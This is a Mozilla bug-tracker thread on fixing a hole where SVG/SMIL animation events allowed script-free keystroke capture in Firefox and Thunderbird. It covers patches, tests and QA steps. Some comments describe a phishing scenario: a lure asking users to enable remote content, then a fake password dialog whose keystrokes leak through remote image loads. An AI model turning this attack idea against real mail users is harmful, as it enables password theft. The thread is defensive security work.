We probably want to neuter all of those events when scripts are disabled -- not just accessKey. It might be best to just drop the "mParams.mType == nsSMILTimeValueSpecParams::ACCESSKEY" conditional in the already-landed patch...
(I'm not sure if that would break other things in script-disabled environments, though -- e.g. maybe we need event-registration for other types of SMIL timing, like e.g. repeat values?)

On the other hand, maybe event-triggered animations (aside from accessKey) aren't worth worrying about, in non-scripted environments. They're kind of equivalent to ":hover" CSS styling, which works regardless of script-enabled state.
Offhand, I can't think of anything particularly evil that an attacker could do from e.g. making an animation with begin="click" or begin="mouseover" (beyond what you could already do with :hover).
Mario / Giorgio, perhaps you guys can think of something creative/nefarious? :)

Note that dveditz posted that comment & sg:low rating \*before\* I presented him with the spoofing/phishing attack scenario that he mentioned in [comment 58](/show_bug.cgi?id=704482#c58 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript") (and that I demoed as "demo .eml #2")
Based on his sentiment in [comment 58](/show_bug.cgi?id=704482#c58 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript") and an IRC discussion with him around that time, I suspect he might be reconsidering the "low" rating. (not sure though)

Reasoning for why we should get this fix in Thunderbird releases ASAP:
======================================================================
This bug allows for Thunderbird emails to be interactive (despite script-disabledness) to the extent that they can phish users' email passwords, \*if\* the users have enabled remote content.
The remote-content requirement isn't too high of a bar, either -- an attack email can easily entice a user to enable remote content by saying (perhaps accurately):
This email includes hot porn / hilarious cat gifs! Just click
the [Show Remote Content] button above in order for it to show up!!!
At that point, the attack email could trigger a phishing password dialog to appear like in my Demo #2, and (if the user is fooled) exploit this bug to make keystrokes trigger (invisible) remote image-loads, thereby sending the user's mail password to a remote attacker.

I have been testing this feature for some time as well but failed in finding an exploitable scenario.
Taken this code, we can create a connection between SVG elements anywhere in the document and a HTML element:
<a id="x" href="#" onmouseover="this.href='#0'">CLICKME</a>
<svg>
<set attributeName="color" xlink:href="#x" to="green" begin="DOMSubtreeModified" />
</svg>
Once you hover the link it will turn green (onmouseover -> DOM change -> DOMSubtreeModified -> color change). The example shows, how a DOM Level 3 event will trigger the <set> tag to do its job for an element referenced by ID. Unlike the "keylogger" the scope of the event handling will not leak to other elements:
<a id="x" href="#">CLICKME</a>
<a id="y" href="#" onmouseover="this.href=123">CLICKME</a>
<svg>
<set attributeName="color" xlink:href="#x" to="green" begin="DOMSubtreeModified" />
</svg>
In this second example, hovering the link number two will \_not\_ turn the first link green. So far so good.
In general it seems that only CSS values can be set and animated - once we're in an inline-SVG context. I tried to manipulate a set of interesting XML/HTML attributes as well as DOM properties via set and animate but it didn't work so far.

Here's a patch to do that.
This allows event-listener registration for the following sorts of animations:
<animate begin="otherAnim.repeat(1)" ... />
<animate begin="otherAnim.repeat" ... />
<animate begin="otherAnim.repeatEvent" ... />
<animate begin="otherAnim.beginEvent" ... />
<animate begin="otherAnim.endEvent" ... />
Note that "otherAnim.begin" and "otherAnim.end" will also still work, because they're registered in a different manner (not using event-listeners, but rather using syncbase timing).
I'm about to write a set of automated tests to verify that all of the above events will still work as time values in script-disabled contexts. I believe this to be the case based on local manual testing, so I'm posting the patch now, with tests coming soon.

(by which I mean -- the test demonstrates that the whitelisted events still work as triggers for animation timing, even in the script-disabled context of SVG-as-an-image -- whereas other events ("SVGLoad" in particular) do not work)

Thanks! That's good to know.
Still, to be on the safe side, birtles & I (& roc, via IRC) are thinking it'll be safest to disable event-based SMIL animations when scripts are off, as noted in [comment 67](/show_bug.cgi?id=704482#c67 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript"), (There are a lot of different events that animations can trigger off of, and there will only be more in the future -- so it's best to close that potential information-leak and whitelist specific events that are known-safe/wanted/useful in script-disabled contexts.)

For CSS, I believe we should only be allowing SMIL animation of the properties listed here:
<http://mxr.mozilla.org/mozilla-central/source/content/smil/nsSMILCSSProperty.cpp#230>
If you notice that we're animating other properties as well, I'd be interested to know (though that's not necessarily bad).
And RE XML/XHTML attributes on non-SVG elements -- yup, those aren't SMIL-animatable as of now. We pass out handles for animating XML attributes via the function "GetAnimatedAttr", and there's basically only one non-trivial implementation of that function -- in nsSVGElement:
<http://mxr.mozilla.org/mozilla-central/source/content/svg/content/src/nsSVGElement.cpp#2126>
So that means animation of XML attributes is SVG-specific and has special code for handling each attribute (and if an attribute isn't explicitly handled, we won't animate it).

Raising sg: severity, this could be an unexpected and effective password-phishing attack against Thunderbird users. The only mitigation is that you would first need some social engineering to convince users to allow remote content. In a targeted attack you could forge the sender to be one the users would likely have whitelisted to always allow remote images.
We have chem-spilled for sg:low bugs in the past if the conditions are right. Using this bug may require fooling users but you can fool all the users some of the time, and some of the users all of the time; Thunderbird has enough users that this could result in a lot of sad, sad, people.
Keep in mind this is somewhat a public issue: .mario tweeted the basics before I asked him to file a bug. The Thunderbird password prompt attack came out of a brief IRC chat, I have no doubt dozens of people will reinvent that idea.

patch 1 v2a: Parse but don't register
Re-requesting beta approval on patch 1, given [comment 73](/show_bug.cgi?id=704482#c73 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript"). (see also my justification in [comment 66](/show_bug.cgi?id=704482#c66 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript"))
(Note: It'd be nice to get patch 2 into beta as well, but that's not as big of a deal, since there's less to be gained by an attacker from "wiretapping" non-keystroke events fired by the document. patch 2 is just a broadening of patch 1 to cover a wider range of events, as defense-in-depth, basically.)

Looks good! Thanks Daniel!
Given the size of the branch (and especially the comment), I'd prefer moving the added code to a separate method called, e.g. IsWhiteListedEvent, since I think that would making reading the code easier but that's totally just a matter of personal style so feel free to land as is.
e.g.
if (!aTarget->GetOwnerDocument()->IsScriptEnabled() && !IsWhiteListedEvent())
return;

patch 3: tests to prove that whitelisted event-based animation still works
Looks good. Only one minor suggestion in addition to the zoom in changes we discussed (thanks for that!):
>diff --git a/image/test/mochitest/lime-anim-100x100.svg b/image/test/mochitest/smil-event-SVGLoad.svg
...
>+ <!-- After 100ms, we zoom in this lime rect and succeed -->
> <rect x="-600" width="100%" height="100%" fill="lime">
>- <animate attributeName="x" by="600" dur="0.1" fill="freeze"/>
>+ <animate attributeName="x" by="600" begin="100ms"
>+ dur="0.1" fill="freeze"/>
>+ </rect>
>+
>+ <!-- HOWEVER if "SVGLoad" is recognized as a valid event,
>+ then this orange rect will zoom in first, and cover up
>+ the to-be-zoomed-in lime rect. -->
>+ <rect x="-600" width="100%" height="100%" fill="orange">
>+ <animate attributeName="x" by="600" begin="svg.SVGLoad"
>+ dur="0.1" fill="freeze"/>
This is a really small nit but I think it would help if you mentioned why this
animation must necessarily play first (that is, because all animations are
relative to the SVGLoad event so it's impossible that the other animation could
play first).
Thanks again!

To make approval simpler: here's a rollup of patches 1 and 2. This is the code that I'd like to land on beta & aurora branches.
(The tests in patch 3 aren't to be backported, since they rely on jwir3's utility js library "animationPolling.js" from [bug 666446](/show_bug.cgi?id=666446 "RESOLVED FIXED - lots of animated gifs swamp us with paint events"), and that only exists on trunk right now.)

I backed out patches 2 & 3 (from [comment 79](/show_bug.cgi?id=704482#c79 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript")) because of a leak -- I'd forgotten that NS\_NewAtom() leaks if you don't stick its result in a refcounted pointer.
Tweaked non-leaky "patch 2" revision coming up which just sticks the new atoms in nsGkAtomList, since there's no reason not to.

This fixes the leak mentioned in previous comment.
Turns out "repeatEvent" already exists in nsGkAtoms, so this patch just adds "endEvent" and "beginEvent".

I didn't re-land patch 3 (mochitest to prove that whitelisted events are still allowed), because my Try push shows that it times out some small (but nonzero) fraction of the time, and I don't want to introduce an additional randomorange. My suspicion is that the timeout is due to a bug in animationPolling.js -- this is the first test (AFAIK) to chain more than two animated images together using animationPolling.js, so it might be tickling some aspect of that library that we haven't run into before.
I'll investigate that & land patch 3 at some point soon -- at the latest, when I circle back to land actual regressoin tests for this bug (which I wouldn't be able to land right now without exposing the attack).

For the record, that try push is:
<https://tbpl.mozilla.org/?tree=Try&rev=6f750e09589a>
and the timeouts look like:

Steps for QA to verify that this bug is fixed...
...IN FIREFOX:
0. (I'm assuming you're using a fresh profile, which has scripts enabled)
1. View [attachment 579508](/attachment.cgi?id=579508 "demo .eml #2: fake password dialog") [[details]](/attachment.cgi?id=579508&action=edit "demo .eml #2: fake password dialog")
2. Type "asdf" into the popup that appears
---> The text "WARNING: CAUGHT KEYPRESS" should appear & change color as you type
(This is expected; scripts are enabled, so we allow keypress-triggered animation)
3. Now disable scripts (At "Content" tab in Firefox preferences, uncheck "Enable JavaScript")
4. Repeat steps 1 & 2.
----> No "WARNING" should appear.
...IN THUNDERBIRD:
0. Save a copy of [attachment 579508](/attachment.cgi?id=579508 "demo .eml #2: fake password dialog") [[details]](/attachment.cgi?id=579508&action=edit "demo .eml #2: fake password dialog") (as a .eml file)
1. In Thunderbird, do "File | Open Saved Message", and pick your saved copy.
2. Type "asdf" into the popup that appears
----> No "WARNING" should appear.
